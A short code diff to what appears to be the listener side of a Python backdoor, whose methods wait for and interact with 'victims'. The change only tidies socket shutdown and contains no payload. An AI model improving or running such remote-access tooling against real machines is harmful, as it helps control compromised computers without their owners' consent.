@@ -41,6 +41,7 @@ class Server:
     Thread(target=self._listen).start()
 
   def close(self):
+    self.server.shutdown(socket.SHUT_RDWR)
     self.server.close()
 
   def wait_victims(self):
@@ -123,7 +124,7 @@ def main():
       break # If not victim are selected stop the program.
     server.interact_with_victim(victim)
 
-  server.server.close()
+  server.close()
   print('Backdoor is now closed 🙈')
 
 if __name__ == '__main__':
